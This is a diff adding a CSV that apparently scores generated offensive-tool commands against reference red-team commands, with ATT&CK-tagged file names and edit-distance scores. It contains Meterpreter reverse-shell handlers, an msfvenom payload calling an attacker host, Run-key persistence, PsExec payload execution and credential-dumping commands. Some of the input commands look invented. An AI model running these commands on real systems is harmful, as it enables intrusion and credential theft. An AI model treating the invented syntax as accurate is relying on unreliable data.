@@ -1,0 +1,56 @@
+file,tool,input_command,matched_command,edit_score,match_found
+command_adfind_TA0007_T1087.txt,adfind,"adfind -f ""(objectcategory=computer)""","adfind -f ""(objectcategory=group)""`",0.861,True
+command_adfind_TA0007_T1087.txt,adfind,"adfind -b dc=joehome,dc=net -f ""objectcategory=person"" -showdel",`adfind.exe -f (objectcategory=person) > ad_users.txt`,0.615,True
+command_adfind_TA0007_T1087.txt,adfind,"adfind -default -rb cn=users -f ""&(objectcategory=person)(samaccountname=*)""","adfind -f ""(objectcategory=group)""`",0.577,True
+command_adfind_TA0007_T1087.txt,adfind,"adfind -b dc=joehome,dc=net -f ""!(objectcategory=computer)""","adfind -f ""(objectcategory=group)""`",0.66,True
+command_metasploit_TA0003_T1505.txt,metasploit,msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.0.1; set LPORT 443; run',"```
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+```",0.575,True
+command_metasploit_TA0003_T1505.txt,metasploit,"msfconsole -x 'use exploit/windows/local/ meterpreter_persistence; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.0.1; set LPORT 443; set PersistenceRegKey ""SOFTWARE\Microsoft\Windows\CurrentVersion\Run""; set PersistenceDLLName ""meterpreter.dll""; run'","```
+    use exploit/multi/handler
+    set payload windows/meterpreter/reverse_https
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+    ```",0.404,True
+command_metasploit_TA0004_T1068.txt,metasploit,msfconsole,`sudo msfconsole`,0.741,True
+command_metasploit_TA0004_T1068.txt,metasploit,search privilege_escalation,`meterpreter> getsystem -t 1`,0.321,True
+command_metasploit_TA0004_T1068.txt,metasploit,use exploit/windows/local/...,`meterpreter > load powershell`,0.333,True
+command_metasploit_TA0004_T1068.txt,metasploit,set RHOST <target_ip>,`msfvenom -p python/meterpreter/reverse_https LHOST=<attacker IP> LPORT=8443 -o python.py`,0.252,True
+command_metasploit_TA0004_T1068.txt,metasploit,set PAYLOAD windows/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.588,True
+command_metasploit_TA0004_T1068.txt,metasploit,exploit,`meterpreter > load powershell`,0.211,True
+command_metasploit_TA0004_T1068.txt,metasploit,getsystem,`meterpreter> getsystem -t 1`,0.474,True
+command_metasploit_TA0011_T1219.txt,metasploit,set PAYLOAD windows/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.588,True
+command_metasploit_TA0011_T1219.txt,metasploit,set RHOSTS 192.168.0.1-192.168.0.10,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.18,True
+command_metasploit_TA0011_T1219.txt,metasploit,set RPORT 443,`msfvenom -p python/meterpreter/reverse_https LHOST=<attacker IP> LPORT=8443 -o python.py`,0.214,True
+command_metasploit_TA0011_T1219.txt,metasploit,exploit -j -z -u -p <attacker_username> -P <attacker_password> -r <remote_host> -o,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.291,True
+command_metasploit_TA0011_T1219.txt,metasploit,meterpreter > shell,`meterpreter > load powershell`,0.76,True
+command_metasploit_TA0011_T1219.txt,metasploit,shell -i -w <local_port> -e <remote_host> -p <remote_port>,`meterpreter > powershell_import /home/<attacker>/carbanak/Resources/step6/powerview.ps1`,0.272,True
+command_metasploit_TA0011_T1219.txt,metasploit,meterpreter > change_wallpaper <background_image_path>,`meterpreter> getsystem -t 1`,0.434,True
+command_metasploit_TA0011_T1219.txt,metasploit,meterpreter > play_sound <sound_file_path>,`meterpreter > load powershell`,0.548,True
+command_metasploit_TA0011_T1219.txt,metasploit,meterpreter > read_aloud <text_to_read>,`meterpreter > powershell_execute Get-NetComputer`,0.539,True
+command_metasploit_TA0011_T1219.txt,metasploit,meterpreter > volume_control -m 50 -s off,`meterpreter > migrate -N mstsc.exe `,0.513,True
+command_metasploit_TA0011_T1219.txt,metasploit,meterpreter > exit,`meterpreter> getsystem -t 1`,0.638,True
+command_psexec_TA0002_T1106.txt,psexec,"psexec \\remote_system -u domain\username -p password osql.exe -S <SQL_Server_Instance> -Q ""SELECT * FROM database.table""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.326,True
+command_windows_credential_editor_TA0009_T1213.txt,windows credential editor,windows-credential-editor -K,"```sh
+wce.exe -w
+```",0.292,True
+command_windows_credential_editor_TA0009_T1213.txt,windows credential editor,windows-credential-editor -k <kerberos_ticket_file>,"```sh
+wce.exe -w
+```",0.197,True
+command_windows_credential_editor_TA0009_T1213.txt,windows credential editor,"windows-credential-editor -g ""<password>""","```sh
+wce.exe -w
+```",0.262,True
+command_windows_credential_editor_TA0009_T1213.txt,windows credential editor,windows-credential-editor -w,"```sh
+wce.exe -w
+```",0.333,True
+command_windows_credential_editor_TA0009_T1213.txt,windows credential editor,windows-credential-editor -f,"```sh
+wce.exe -w
+```",0.292,True
